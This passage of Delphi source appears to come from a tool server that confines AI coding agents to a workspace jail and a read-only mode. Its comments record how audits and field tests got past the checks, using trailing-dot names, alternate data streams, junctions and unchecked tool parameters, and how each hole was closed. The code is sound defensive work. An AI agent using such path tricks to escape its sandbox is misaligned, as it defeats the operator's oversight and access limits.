      Exit(SR_PASERVER_PASSWORD);
end;

{ '' unless APath IS one of the configured roots (the jail itself). With no
  roots configured (unrestricted local mode) there is no jail to protect and
  nothing is refused - same model as PathDenied. }
function RootItselfDenied(const APath: string): string;
var
  R, Full: string;
begin
  Result := '';
  if APath.Trim = '' then
    Exit;
  try
    Full := IncludeTrailingPathDelimiter(TPath.GetFullPath(APath));
  except
    Exit; // an unparseable path is PathDenied's business, not ours
  end;
  for R in WorkspaceRoots do
    if SameText(R, Full) then
      Exit(Format(SR_ROOT_ITSELF_FMT, [ExcludeTrailingPathDelimiter(R)]));
end;

// Parameter ALIASES, per tool, applied only when the real name is absent:
// the same idea is spelled query / pattern / filter across tools and an
// agent that learned one spelling loses a call ("Unknown parameter") on the
// next tool (measured 2026-08-23: three in a 25-minute session). Never an
// alias that the tool already declares with another meaning (delphi_search
// has both query and pattern). The declared name stays the documented one.
procedure ApplyArgAliases(const AToolName: string; AArguments: TJSONObject);
const
  // tool, alias, real
  Aliases: array [0 .. 24, 0 .. 2] of string = (
    // "path" is what almost every other tool calls it; delphi_list calls it
    // "root" and delphi_projects too. Each spelling cost a wasted call
    // (measured 2026-08-25), and the fix is free: accept both.
    ('delphi_list', 'path', 'root'),
    ('delphi_list', 'dir', 'root'),
    ('delphi_projects', 'path', 'root'),
    // add-unit/remove-unit take "path"; "unit" is what everybody types first.
    ('delphi_config', 'unit', 'path'),
    ('delphi_config', 'file', 'path'),
    // Names that cost a call every time somebody guessed the obvious one.
    ('delphi_read', 'from', 'fromline'),
    ('delphi_read', 'to', 'toline'),
    ('delphi_search', 'path', 'root'),
    ('delphi_report', 'body', 'message'),
    ('delphi_report', 'text', 'message'),
    ('vault_search', 'query', 'pattern'),
    ('vault_search', 'filter', 'pattern'),
    ('delphi_list', 'filter', 'pattern'),
    ('delphi_list', 'mask', 'pattern'),
    ('delphi_components', 'pattern', 'filter'),
    ('delphi_components', 'query', 'filter'),
    ('delphi_read', 'startline', 'fromline'),
    ('delphi_read', 'endline', 'toline'),
    ('delphi_search', 'text', 'query'),
    ('vault_read', 'linecount', 'limit'),
    ('delphi_designer', 'class', 'classname'),
    // El rango de delphi_edit / delphi_textedit se llama "toline" porque asi
    // se llama ya en delphi_read: mismo concepto, mismo nombre. Y por lo
    // mismo se le aceptan los mismos dos apodos.
    ('delphi_edit', 'to', 'toline'),
    ('delphi_edit', 'endline', 'toline'),
    ('delphi_textedit', 'to', 'toline'),
    ('delphi_textedit', 'endline', 'toline'));
var
  I: Integer;
  P: TJSONPair;
begin
  if not Assigned(AArguments) then
    Exit;
  for I := Low(Aliases) to High(Aliases) do
  begin
    if not SameText(Aliases[I, 0], AToolName) then
      Continue;
    P := nil;
    for var Q in AArguments do
      if TMCPSerializer.NormalizeKey(Q.JsonString.Value) =
         TMCPSerializer.NormalizeKey(Aliases[I, 1]) then
      begin
        P := Q;
        Break;
      end;
    if P = nil then
      Continue;
    if ArgStr(AArguments, Aliases[I, 2]) <> '' then
    begin
      // the real name is there: it wins; the alias is dropped, not refused
      AArguments.RemovePair(P.JsonString.Value).Free;
      Continue;
    end;
    var V := P.JsonValue.Clone as TJSONValue;
    AArguments.RemovePair(P.JsonString.Value).Free;
    AArguments.AddPair(Aliases[I, 2], V);
  end;
end;

{ Los parametros que llevan CONTENIDO, no rutas: su texto es de un fichero o
  de un mensaje y no pertenece al espacio de nombres de rutas. Lo usan las DOS
  pasadas que recorren los argumentos de una llamada -la que expande unidades
  virtuales y la que comprueba la jaula-, y por eso vive aqui y no copiada en
  cada una: si una aprendiese un parametro nuevo y la otra no, o se
  comprobaria una ruta sin expandir, o se tomaria un contenido por ruta. }
const
  PARAMS_CON_CONTENIDO: array [0 .. 6] of string = (
    'new', 'old', 'content', 'data', 'message', 'code', 'args');

{ Una ruta ABSOLUTA de verdad: <letra>:<separador> o un UNC. A proposito NO
  cuenta "D:" a secas ni nada relativo - el suelo de abajo solo puede morder
  donde esta seguro, porque muerde ANTES de que la tool mire sus argumentos y
  un falso positivo ahi rechaza una llamada legitima sin que nadie sepa por
  que. Las formas raras (la unidad sin separador, los nombres con punto o
  espacio al final) las sigue cazando PathAnomaly dentro de PathDenied. }
function EsRutaAbsoluta(const AValue: string): Boolean;
begin
  Result := ((Length(AValue) >= 3) and (AValue[2] = ':') and
             CharInSet(AValue[1], ['A' .. 'Z', 'a' .. 'z']) and
             CharInSet(AValue[3], ['\', '/'])) or
            ((Length(AValue) >= 2) and
             (((AValue[1] = '\') and (AValue[2] = '\')) or
              ((AValue[1] = '/') and (AValue[2] = '/'))));
end;

{ EL SUELO DE LA JAULA, en la puerta y para TODAS las tools.

  La regla ya estaba en una sola funcion (PathDenied / ReadPathDenied). Lo que
  no estaba centralizado era ACORDARSE de llamarla: ~60 llamadas a mano en
  una veintena de units, y nada obligaba a una tool nueva -ni a un parametro
  nuevo de una vieja- a pasar por ahi. Medido el 2026-09-21 con los destinos
  que elige quien llama: delphi_adb y delphi_package comprobaban, y
  delphi_desktop -en Windows y en Linux- no; con el nodo real, una llamada
  consiguio que el servidor escribiera una captura del escritorio del
  operador FUERA de la jaula. La frontera de verdad era "te acordaste?". Lo
  pregunto David: "tambien controlamos la jaula en 7 sitios o lo tenemos
  centralizado?".

  HISTORIA, porque la idea tuvo un primer intento y conviene no repetirlo:
  el 21-sep se escribio reconociendo las rutas por EXCLUSION (todo argumento
  que no fuera de contenido) y tumbo un delphi_search con
  query="D:\Proyectos" - un texto a buscar que PARECE una ruta. Tres baterias
  en rojo y retirado el mismo dia. Una lista de exclusion vale para
  REESCRIBIR, donde equivocarse es inocuo; esto RECHAZA, y entonces lo que no
  conoces tiene que pasar. Ahora solo muerde lo que lleva la marca
  [RutaDelServidor] (Lsp.Attributes): inclusion, declarada por quien diseno
  el parametro, leida por RTTI del registro REAL de tools.

  QUE ES Y QUE NO ES. Es un SUELO, una capa REDUNDANTE: no sustituye a las
  llamadas de cada tool. La puerta no sabe si la tool va a LEER o a ESCRIBIR
  ese argumento, asi que aplica la regla ANCHA (ReadPathDenied, que perdona
  la zona de biblioteca y las carpetas de solo lectura): nunca rechaza algo
  que una tool habria aceptado, solo caza lo que NINGUNA deberia aceptar. NO
  ve a un agente escribiendo en el subarbol confinado de otro, ni en la RTL:
  eso sigue siendo de PathDenied, en cada tool. El dia que alguien quite esas
  llamadas "porque ya esta centralizado", esta lista pasa de red a punto
  unico de fallo y un parametro sin marca es una ruta sin jaula (dictamen de
  la auditoria del 21-sep). No se quitan.

  SOLO RUTAS ABSOLUTAS, a proposito. Una relativa se resuelve contra una base
  que solo conoce la tool (delphi_config.path va contra la carpeta del
  proyecto); la puerta la resolveria contra el directorio del proceso y
  rechazaria llamadas correctas. La auditoria propuso comprobarlas tambien:
  verificado contra el codigo, aqui seria un falso positivo seguro. }
var
  GRutasNuestras: TDictionary<string, Boolean> = nil; // 'tool|parametro'

{ El mapa de parametros marcados, montado UNA vez desde el registro real.
  Sin cerrojo: cada hilo que llegue a la vez monta el suyo y solo uno se
  publica; los demas tiran el suyo. Instanciar las tools aqui es barato (un
  constructor que pone nombre y descripcion) y pasa una sola vez. }
function RutasNuestras: TDictionary<string, Boolean>;
var
  Mapa: TDictionary<string, Boolean>;
  Ctx: TRttiContext;
  Nombre: string;
  Tool: IMCPTool;
  Con: IMCPToolParams;
  Prop: TRttiProperty;
  Attr: TCustomAttribute;
begin
  Result := GRutasNuestras;
  if Result <> nil then
    Exit;
  Mapa := TDictionary<string, Boolean>.Create;
  Ctx := TRttiContext.Create;
  try
    for Nombre in TMCPRegistry.GetToolNames do
    begin
      Tool := TMCPRegistry.CreateTool(Nombre);
      if not Supports(Tool, IMCPToolParams, Con) then
        Continue;
      for Prop in Ctx.GetType(Con.ParamsClass).GetProperties do
        for Attr in Prop.GetAttributes do
          if Attr is RutaDelServidorAttribute then
            // La MISMA normalizacion con la que el binder casa argumento y
            // propiedad: un solo nombrador, o la puerta miraria un nombre y
            // la tool recibiria otro.
            Mapa.AddOrSetValue(LowerCase(Nombre) + '|' +
              TMCPSerializer.NormalizeKey(Prop.Name), True);
    end;
  finally
    Ctx.Free;
  end;
  if InterlockedCompareExchangePointer(Pointer(GRutasNuestras),
       Pointer(Mapa), nil) <> nil then
    Mapa.Free;
  Result := GRutasNuestras;
end;

{ Cuantos parametros vigila el suelo. Lo publica delphi_workspace y lo mide
  test_round45 contra las marcas del fuente: un suelo redundante que se
  quedase VACIO (RTTI que no emite, un registro que cambia) no romperia nada
  y nadie lo notaria - que es justo el fallo que hay que poder ver. }
function ServerPathParamCount: Integer;
begin
  Result := RutasNuestras.Count;
end;

function ArgPathOutsideDenied(const AToolName: string;
  const AArguments: TJSONObject): string;
var
  I: Integer;
  P: TJSONPair;
  V: string;
  Mapa: TDictionary<string, Boolean>;
begin
  Result := '';
  if not Assigned(AArguments) then
    Exit;
  // Sin jaula configurada no hay nada que hacer cumplir (modo local de
  // confianza): el suelo no se inventa una.
  if Length(WorkspaceRoots) = 0 then
    Exit;
  Mapa := RutasNuestras;
  for I := 0 to AArguments.Count - 1 do
  begin
    P := AArguments.Pairs[I];
    if not (P.JsonValue is TJSONString) then
      Continue;
    if not Mapa.ContainsKey(LowerCase(AToolName) + '|' +
         TMCPSerializer.NormalizeKey(P.JsonString.Value)) then
      Continue;
    V := TJSONString(P.JsonValue).Value;
    if not EsRutaAbsoluta(V) then
      Continue;
    Result := ReadPathDenied(V);
    if Result <> '' then
      Exit;
  end;
end;

function GitCommandIsQuery(const ACmd, AArgs, AMessage: string): Boolean;
begin
  Result := MatchText(Trim(ACmd), ['status', 'diff', 'log', 'show']) or
    (MatchText(Trim(ACmd), ['branch', 'tag']) and (Trim(AArgs) = '') and (Trim(AMessage) = '')) or
    // worktree list solo ENSENA las copias de trabajo (1.4.0)
    (SameText(Trim(ACmd), 'worktree') and SameText(Trim(AArgs), 'list'));
end;

function ToolCallDenied(const AToolName: string;
  const AArguments: TJSONObject): string;
var
  Cmd, GitArgs, GitMsg: string;
begin
  // Duplicate parameter names FIRST, before normalization and before any other
  // check: two keys that normalize the same would let the gate inspect one
  // value while the binder hands the tool the other, and ExpandVirtualDrives
  // below rewrites by first exact name. Fail closed on the ambiguity.
  Result := DuplicateArgDenied(AArguments);
  if Result <> '' then
    Exit;
  // Normalization second, unconditionally: virtual drive units in the
  // arguments become real server paths before any check or any tool.
  ExpandVirtualDrives(AArguments);
  ApplyArgAliases(AToolName, AArguments);
  Result := '';
  // Read-only comes FIRST for the tools it refuses outright. The argument
  // filters below are universal on purpose, but letting one of them answer
  // first meant a read-only server explained a git remote policy instead of
  // saying the obvious thing: nothing writes here (v0.62).
  if IsReadOnlyNow and
     MatchText(AToolName, ['delphi_edit', 'delphi_textedit', 'delphi_create',
       'delphi_changeset', 'delphi_build', 'delphi_package',
       'delphi_upload', 'delphi_delete', 'delphi_move', 'delphi_desktop',
       'vault_append', 'vault_create', 'vault_patch']) then
    Exit(WriteDenied(AToolName));
  // ...and the same for the WRITING half of delphi_git: on a read-only server
  // a clone has no business being explained in terms of remote policy.
  if IsReadOnlyNow and SameText(AToolName, 'delphi_git') then
  begin
    Cmd := ArgStr(AArguments, 'command');
    if not GitCommandIsQuery(Cmd, ArgStr(AArguments, 'args'), ArgStr(AArguments, 'message')) then
      Exit(WriteDenied(Trim('delphi_git ' + Cmd)));
  end;
  // EL SUELO de la jaula, para todas las tools: todo argumento marcado
  // [RutaDelServidor] que sea una ruta absoluta tiene que caer dentro de lo
  // que este workspace puede LEER. Redundante a proposito - la nota larga
  // esta sobre ArgPathOutsideDenied.
  Result := ArgPathOutsideDenied(AToolName, AArguments);
  if Result <> '' then
    Exit;
  // Universal git-argument filter (BOTH access levels): a dangerous option
  // would let even a read-write client escape the jail. The single place git
  // freeform args are vetted.
  if SameText(AToolName, 'delphi_git') and Assigned(AArguments) then
  begin
    GitArgs := ArgStr(AArguments, 'args');
    Result := GitArgDenied(GitArgs);
    if Result <> '' then
      Exit;
    // An explicit URL anywhere in a git call is an outbound connection this
    // machine is about to make. It goes through the operator's allowlist -
    // args AND message, because clone carries the URL in the latter.
    Result := GitRemoteDenied(GitArgs);
    if Result = '' then
      Result := GitRemoteDenied(ArgStr(AArguments, 'message'));
    if Result <> '' then
      Exit;
  end;
  // Universal build-argument filter (BOTH access levels): platform, config and
  // target land in a cmd.exe line, so a metacharacter there is arbitrary
  // execution - and it would sail past the jail, the sandbox and the
  // .dproj hazard scanner in a single call.
  if SameText(AToolName, 'delphi_build') then
  begin
    Result := BuildArgDenied(AArguments);
    if Result <> '' then
      Exit;
  end;
  // The workspace ROOT is the jail, not a file: delete/move would relocate the
  // whole workspace and write its recoverable copy in the root's PARENT,
  // outside the roots. Refused for EVERY credential - a read-write agent does
  // it just as thoroughly as a read-only one would like to.
  if MatchText(AToolName, ['delphi_delete', 'delphi_move']) then
  begin
    Result := RootItselfDenied(ArgStr(AArguments, 'path'));
    if Result <> '' then
      Exit;
  end;
  // Universal PAServer-argument filter (BOTH access levels): profile name,
  // host, port, platform and password land on the paclient command line, and
  // the name becomes a file in %APPDATA%.
  if SameText(AToolName, 'delphi_paserver') then
  begin
    Result := PAServerArgDenied(AArguments);
    if Result <> '' then
      Exit;
  end;
  // Universal adb-argument filter (BOTH access levels): address and serial
  // land on the adb command line.
  if SameText(AToolName, 'delphi_adb') then
  begin
    Result := AdbArgDenied(AArguments);
    if Result <> '' then
      Exit;
  end;
  if not IsReadOnlyNow then
    Exit;
  // Fully mutating tools: refused outright in read-only mode.
  if MatchText(AToolName, ['delphi_edit', 'delphi_textedit', 'delphi_create',
    'delphi_changeset',
    'delphi_build', 'delphi_package', 'delphi_upload',
    'delphi_delete', 'delphi_move',
    // The knowledge vault: reading is fine read-only, writing never is.
    'vault_append', 'vault_create', 'vault_patch']) then
    Exit(WriteDenied(AToolName));
  // delphi_config is mixed: "view" reads, "add-platform" writes the .dproj.
  if SameText(AToolName, 'delphi_config') then
  begin
    Cmd := ArgStr(AArguments, 'command');
    if (Trim(Cmd) = '') or SameText(Trim(Cmd), 'view') then
      Exit;
    Exit(WriteDenied('delphi_config ' + Cmd));
  end;
  // delphi_test is mixed: discover only looks; run builds and EXECUTES.
  if SameText(AToolName, 'delphi_test') then
  begin
    Cmd := Trim(ArgStr(AArguments, 'command'));
    if (Cmd = '') or SameText(Cmd, 'discover') then
      Exit;
    Exit(WriteDenied('delphi_test ' + Cmd));
  end;
  // delphi_styles is mixed: view/get/lint read; set/clone/build write.
  if SameText(AToolName, 'delphi_styles') then
  begin
    Cmd := Trim(ArgStr(AArguments, 'command'));
    if (Cmd = '') or MatchText(Cmd, ['view', 'get', 'lint']) then
      Exit;
    Exit(WriteDenied('delphi_styles ' + Cmd));
  end;
  // delphi_paserver is mixed: the listing commands read; add-profile writes a
  // connection profile on the server and test-connection dials the target
  // with its stored credential.
  if SameText(AToolName, 'delphi_paserver') then
  begin
    Cmd := Trim(ArgStr(AArguments, 'command'));
    if (Cmd = '') or MatchText(Cmd, ['platforms', 'packages', 'profiles']) then
      Exit;
    Exit(WriteDenied('delphi_paserver ' + Cmd));
  end;
  // delphi_designer is mixed: to-text / to-binary rewrite the .dfm/.fmx; the
  // rest looks. Listed by what READS, so an unknown command fails closed
  // (it was in no list at all: a read-only credential rewrote forms -
  // audit 2026-09-25).
  if SameText(AToolName, 'delphi_designer') then
  begin
    Cmd := Trim(ArgStr(AArguments, 'command'));
    if (Cmd = '') or MatchText(Cmd, ['info', 'prop', 'tree', 'get', 'lint',
      'check-binding', 'binding', 'layout']) then
      Exit;
    Exit(WriteDenied('delphi_designer ' + Cmd));
  end;
  // delphi_adb is mixed: discovering, listing and reading the device log are
  // reads; attaching/detaching a device or installing an app are writes.
  if SameText(AToolName, 'delphi_adb') then
  begin
    Cmd := Trim(ArgStr(AArguments, 'command'));
    // Reads: looking at the device (list, log, screen) changes nothing.
    // connect/disconnect/install/run/tap/key mutate or execute -> write.
    if (Cmd = '') or MatchText(Cmd, ['discover', 'devices', 'logcat',
      'screenshot']) then
      Exit;
    Exit(WriteDenied('delphi_adb ' + Cmd));
  end;
  // delphi_git is mixed: query commands pass, anything that can change the
  // repo or the remote is refused ("branch"/"tag" only LIST when called
  // without arguments; with arguments they create -> write).
  if SameText(AToolName, 'delphi_git') then
  begin
    Cmd := ArgStr(AArguments, 'command');
    GitArgs := ArgStr(AArguments, 'args');
    GitMsg := ArgStr(AArguments, 'message');
    // Pure query commands pass - la MISMA clasificacion que el modo solo
    // lectura y las referencias, GitCommandIsQuery: aqui habia una copia
    // a mano, y el worktree list de la 1.4.0 solo lo habria aprendido una.
    if GitCommandIsQuery(Cmd, GitArgs, GitMsg) then
      Exit;
    Exit(WriteDenied(Trim('delphi_git ' + Cmd)));
  end;
end;

function WorkspaceRoots: TArray<string>;
begin
  // A token-scoped session sees ITS workspace's roots as the whole world:
  // every jail check, listing and scan downstream of this ONE function
  // inherits the boundary. Overlap is deliberate and never subtracts (v0.88).
  if HasActiveWS then
    Exit(ActiveWS.Roots);
  // Modo local de lanzamiento: SOLO el entorno, leido por el cargador con
  // todo lo demas (antes aqui, en el primer uso, con cache propia).
  LoadSecurity;
  Result := GRoots;
end;

function WorkspaceReadOnlyPaths: TArray<string>;
begin
  if HasActiveWS then
    Exit(ActiveWS.ReadOnlyPaths);
  LoadSecurity; // modo local: resuelto contra GRoots en el cargador
  Result := GRoPaths;
end;

function WorkspaceReadOnlyRoots: TArray<string>;
begin
  if HasActiveWS then
    Exit(ActiveWS.ReadOnlyRoots);
  LoadSecurity; // modo local: el entorno, cargado UNA vez con todo lo demas
  Result := GRoRoots;
end;

function ReadOnlyRootOf(const APath: string): string;
var
  Full, Real, R: string;
begin
  Result := '';
  try
    // Formas LARGAS canonicas en los dos lados: una raiz declarada con
    // nombres cortos (DFONTA~1) y una ruta que llega resuelta (RealPath la
    // alarga) son el mismo sitio. Comparar texto contra texto no casaba.
    Full := IncludeTrailingPathDelimiter(LongCanonical(TPath.GetFullPath(APath)));
    // ...y por la ruta REAL: un junction dentro de una raiz que apunte a una
    // referencia (o a una declarada DENTRO de la raiz) llevaba a ella con
    // un texto que no la nombra, y se escribia (auditoria 25-sep-2026).
    Real := IncludeTrailingPathDelimiter(RealPath(APath));
  except
    Exit;
  end;
  for R in WorkspaceReadOnlyRoots do
    if StartsText(IncludeTrailingPathDelimiter(LongCanonical(ExcludeTrailingPathDelimiter(R))), Full) or
       StartsText(IncludeTrailingPathDelimiter(RealPath(ExcludeTrailingPathDelimiter(R))), Real) then
      Exit(ExcludeTrailingPathDelimiter(R));
end;

function WorkspaceJailSummary(out AWarning: Boolean): string;
var
  Roots: TArray<string>;
  Shown: TArray<string>;
  I: Integer;
begin
  Roots := WorkspaceRoots;
  if GRootsInvalid then
  begin
    AWarning := True;
    Result := 'Workspace jail: INVALID roots (fail-closed) - every ' +
      'disk-touching tool is refused. Revisa DELPHI_MCP_ROOTS (lanzamiento local).';
  end
  else if Length(Roots) = 0 then
  begin
    AWarning := True;
    Result := 'Workspace jail: NONE - modo LOCAL de confianza (solo existe ' +
      'en un proceso stdio lanzado por el operador; todo cliente HTTP entra ' +
      'por token de workspace o recibe 401).';
  end
  else
  begin
    AWarning := False;
    // Roots are stored with a trailing delimiter; drop it for readability.
    SetLength(Shown, Length(Roots));
    for I := 0 to High(Roots) do
      Shown[I] := ExcludeTrailingPathDelimiter(Roots[I]);
    Result := 'Workspace jail (roots, ' + Length(Roots).ToString + '): ' +
      string.Join('  |  ', Shown);
  end;
end;

{ Windows silently strips trailing dots/spaces from a file name, so a path
  like "X.pas." creates "X.pas" while any check on the literal string sees a
  different extension. Alternate Data Streams ("X.pas::$DATA") play the same
  trick. Measured bypass in the field test: both defeated the .pas guard of
  delphi_textedit. Any path whose final name would be normalized by the OS
  is refused outright - it is never a legitimate request. }
function PathAnomaly(const APath: string): string;
var
  Name, Rest, Units, List: string;
  C: Char;
begin
  Result := '';
  // A virtual unit that survived the inbound expansion is one this server does
  // not serve: it must be refused BY NAME, never resolved against the real
  // filesystem (that is what leaked the host's drive letters). Only when a
  // virtual namespace exists at all - with no served drive there is nothing to
  // mask and nothing to name.
  Units := ServedDriveLetters;
  C := VirtualUnitLetter(APath);
  if (Units <> '') and (C <> #0) and (Pos(C, Units) = 0) then
  begin
    for C in Units do
    begin
      if List <> '' then
        List := List + ', ';
      List := List + VirtualUnitOf(C, Units) + ':';
    end;
    Exit(Format(SR_UNIT_UNKNOWN_FMT, [APath, List]));
  end;
  // ':' is legal only as the drive separator (C:\...): anywhere else it
  // opens an Alternate Data Stream, which hides content from every check.
  Rest := APath;
  if (Length(Rest) >= 2) and (Rest[2] = ':') then
    Rest := Copy(Rest, 3, MaxInt);
  if Rest.Contains(':') then
    Exit(Format('RECHAZADO: la ruta "%s" contiene ":" fuera de la unidad ' +
      '(flujo alternativo de datos). Usa un nombre de fichero normal.', [APath]));
  // EVERY segment, not just the last: a folder named "notas " normalizes the
  // same way, and checking only the file name left the rest of the path to
  // slip through (field round 9 hit the same class in the vault resolver).
  for Name in ExcludeTrailingPathDelimiter(Rest).Split(['\', '/']) do
  begin
    if Name = '' then
      Continue;
    // "." and ".." are standard navigation, not a normalization trick: the
    // jail canonicalizes before deciding, so an escape via ".." is caught
    // there. Rejecting them here refused legitimate parent-directory paths.
    if (Name = '.') or (Name = '..') then
      Continue;
    if Name.Trim([' ']).TrimRight([' ', '.']) <> Name then
      Exit(Format('RECHAZADO: el nombre "%s" empieza o termina en punto o ' +
        'espacio; Windows los recorta al abrir el fichero, asi que el nombre ' +
        'real seria otro ("%s"). Pide el nombre exacto, sin adornos.',
        [Name, Name.Trim([' ']).TrimRight([' ', '.'])]));
  end;
end;

{ Optional per-agent write confinement (OFF by default). When on, an identified
  agent may write only inside <root>\<its-name>\... or an explicitly shared
  subfolder - so several agents can share one workspace root without stepping on
  each other. A caller with no identity (stdio, the operator's own console) is
  trusted with everything, the same rule the recoverable trash already uses.
  Reading is never confined: an agent still sees the whole tree. }
function TempFolderName: string;
begin
  Result := '__delphi-temp';
end;

function ServerDir(const ASub: string): string;
begin
  Result := TPath.GetDirectoryName(ParamStr(0));
  if ASub <> '' then
    Result := TPath.Combine(Result, ASub);
end;

function ServerTempDir(const ASub: string): string;
begin
  Result := ServerDir(TempFolderName);
  if ASub <> '' then
    Result := TPath.Combine(Result, ASub);
end;

{ El workspace de quien llama. Con varias raices manda la PRIMERA
  ESCRIBIBLE - una raiz declarada entera en ReadOnlyPaths (el clon de
  referencia) no recibe entregables: seria escribir justo donde nuestra
  propia jaula lo prohibe, y la misma ruta pasada a mano en "out" se
  rechaza (auditoria 2026-09-21). Sin ninguna raiz configurada, o ninguna
  escribible, no hay workspace donde dejar nada y se cae a la casa del
  servidor, que siempre existe. La subcarpeta del agente sale de la misma
  identidad que usa el modo confinado, asi que dos agentes en la misma
  jaula no se pisan - y cuando no hay identidad (stdio, la consola del
  operador) no se inventa una. }
function IsAgentCapture(const APath: string): Boolean;
var
  Full: string;
begin
  Result := False;
  try
    Full := TPath.GetFullPath(APath);
  except
    Exit;
  end;
  Result := SameText(TPath.GetExtension(Full), '.png') and
    Full.ToLower.Contains('\' + TempFolderName + '\') and
    MatchText(TPath.GetFileName(TPath.GetDirectoryName(Full)),
      [CAPTURE_SUB_DESKTOP, CAPTURE_SUB_ANDROID]);
end;

procedure ConsumeAgentCapture(const APath: string);
begin
  if not IsAgentCapture(APath) then
    Exit;
  // Consumir es BORRAR: el nombre no basta. Solo lo que esta sesion puede
  // escribir, o lo que esta en la casa del servidor. Lo llaman lectores
  // (delphi_fetch, la descarga), y una referencia con una carpeta de
  // capturas perdia sus ficheros al leerlos (auditoria 25-sep-2026).
  if (PathDenied(APath) <> '') and not StartsText(
       IncludeTrailingPathDelimiter(RealPath(ServerTempDir(''))), RealPath(APath)) then
    Exit;
  try
    if TFile.Exists(APath) then
      TFile.Delete(APath);
  except
    // recoger no puede fallar por no poder borrar
  end;
end;

function AgentTempDir(const ASub: string): string;
var
  Roots: TArray<string>;
  Me, Casa, R, Ro: string;
  SoloLectura: Boolean;
begin
  Roots := WorkspaceRoots;
  Casa := '';
  for R in Roots do
  begin
    SoloLectura := False;
    for Ro in WorkspaceReadOnlyPaths do
      if StartsText(Ro, IncludeTrailingPathDelimiter(R)) then
        SoloLectura := True;
    if ReadOnlyRootOf(R) <> '' then // raiz dentro de una referencia: manda la referencia
      SoloLectura := True;
    if not SoloLectura then
    begin
      Casa := TPath.Combine(ExcludeTrailingPathDelimiter(R), TempFolderName);
      Break;
    end;
  end;
  if Casa = '' then
    Exit(ServerTempDir(ASub));
  // El vaciado NO se hace aqui: se hace entero en el arranque, para todos
  // los workspaces del settings.ini (PurgeServerTemp). Hacerlo en el primer
  // uso se probo y no cumplia lo prometido - si nadie pedia un entregable,
  // nadie limpiaba. Y ademas seria peligroso a mitad de sesion: se llevaria
  // por delante la captura que otro agente acaba de pedir y aun no se ha
  // bajado.
  Result := Casa;
  Me := CurrentAgent;
  if Me <> '' then
    Result := TPath.Combine(Result, Me);
  if ASub <> '' then
    Result := TPath.Combine(Result, ASub);
end;

function CaptureTarget(const AOut, ASub, APrefix, AExt: string;
  out AFile: string): string;
var
  O, Carpeta, Ext: string;
begin
  Result := '';
  AFile := '';
  O := AOut.Trim;
  Carpeta := '';
  if O = '' then
    Carpeta := AgentTempDir(ASub)
  else if O.EndsWith('\') or O.EndsWith('/') or TDirectory.Exists(O) then
    Carpeta := ExcludeTrailingPathDelimiter(O)
  else
  begin
    Ext := TPath.GetExtension(O);
    if Ext = '' then
      Carpeta := O
    else if SameText(Ext, AExt) then
      AFile := O
    else
      Exit(Format(SR_CAPTURE_EXT_FMT, [AExt, Ext]));
  end;
  if AFile = '' then
    // Milisegundos y un fragmento GUID: con resolucion de SEGUNDOS dos
    // capturas del mismo segundo compartian nombre y la segunda pisaba a la
    // primera - las dos llamadas se llevaban la misma imagen.
    AFile := TPath.Combine(Carpeta, Format('%s-%s-%s%s', [APrefix,
      FormatDateTime('yyyymmdd-hhnnsszzz', Now),
      LowerCase(TGUID.NewGuid.ToString.Substring(1, 6)), AExt]));
  if O <> '' then
  begin
    Result := WriteTargetDenied(AFile);
    // Una captura no se guarda en los temporales del servidor: 90 capturas y
    // 66 MB de Hermes en una __delphi-temp anidada que la purga del arranque
    // no alcanza (25-sep-2026). Se omite out y llega en la respuesta (David:
    // 'no queremos acumular capturas, se entregan en una sola llamada y se
    // borran').
    if (Result <> '') and (DeadCopyWriteDenied(AFile) <> '') then
      Result := Result + ' ' + SN_CAPTURE_OUT_TEMP_HINT;
  end;
end;

{ El unico borrador de arboles del servidor (la nota larga, en el
  interface). El bit de reparse se mira ANTES de entrar: el enlace cae,
  el destino ni se mira. }
procedure BorraArbolDentro(const ADir: string);
var
  E: string;
  A: Cardinal;
begin
  A := GetFileAttributes(PChar(ADir));
  if A = INVALID_FILE_ATTRIBUTES then
    Exit; // no esta: nada que borrar
  if EsEnlace(ADir) then
  begin
    // RemoveDir sobre un junction/symlink de directorio elimina el punto
    // de reanalisis y jamas toca lo que hay al otro lado.
    SetFileAttributes(PChar(ADir), FILE_ATTRIBUTE_NORMAL);
    if not RemoveDir(ADir) then
      RaiseLastOSError;
    Exit;
  end;
  // La RTL limpiaba atributos antes de borrar (los objetos de un .git
  // vienen de solo lectura); se conserva ese contrato. Por la API y no por
  // TFile.SetAttributes: esa valida que la ruta sea un FICHERO y sobre un
  // directorio lanza "file not found" - lo cazaron round13 y round44 en la
  // primera pasada de la suite (2026-09-21).
  for E in TDirectory.GetFiles(ADir) do
  begin
    SetFileAttributes(PChar(E), FILE_ATTRIBUTE_NORMAL);
    TFile.Delete(E);
  end;
  for E in TDirectory.GetDirectories(ADir) do
    BorraArbolDentro(E);
  SetFileAttributes(PChar(ADir), FILE_ATTRIBUTE_NORMAL);
  TDirectory.Delete(ADir, False);
end;

function CarpetasDesechables: TArray<string>;
begin
  Result := [TempFolderName, TrashFolderName];
end;

const
  DESCARGA_PREFIJO = '__tmp-'; // empieza por __, como toda zona borrable

function NuevaCarpetaDescarga(const ADentroDe: string): string;
begin
  Result := TPath.Combine(ADentroDe, DESCARGA_PREFIJO +
    LowerCase(TGUID.NewGuid.ToString.Substring(1, 8)));
end;

function EsCarpetaDescarga(const ANombre: string): Boolean;
begin
  // la inversa exacta del nombrador: el prefijo y 8 hexadecimales
  Result := TRegEx.IsMatch(ANombre, '^' + TRegEx.Escape(DESCARGA_PREFIJO) +
    '[0-9a-f]{8}$', [roIgnoreCase]);
end;

function Slug(const S: string): string;
var
  C, Prev: Char;
begin
  Result := '';
  Prev := '-';
  for C in S do
  begin
    if CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9']) then
    begin
      Result := Result + C;
      Prev := C;
    end
    else if Prev <> '-' then
    begin
      Result := Result + '-';
      Prev := '-';
    end;
    if Length(Result) >= 40 then
      Break;
  end;
  Result := Result.Trim(['-']).ToLower;
end;

function LugaresProtegidos: TArray<string>;
var
  W: TWorkspaceDef;
begin
  LoadSecurity;
  Result := GRoots + GRoRoots + GRoPaths + [VaultPath, ExtractFileDir(ParamStr(0)),
    GetEnvironmentVariable('WINDIR'), GetEnvironmentVariable('ProgramFiles'),
    GetEnvironmentVariable('ProgramFiles(x86)'),
    GetEnvironmentVariable('USERPROFILE')];
  for W in GWorkspaces do
    Result := Result + W.Roots + W.ReadOnlyRoots + W.ReadOnlyPaths;
end;

{ La ruta de un enlace se juzga por DONDE ESTA, no por adonde apunta: la ruta
  REAL del padre + el nombre. Quitar o mover un junction nunca toca lo de
  detras, y un junction en el camino no hace pasar una ruta por otra. }
function RutaDelEnlace(const AFull: string): string;
begin
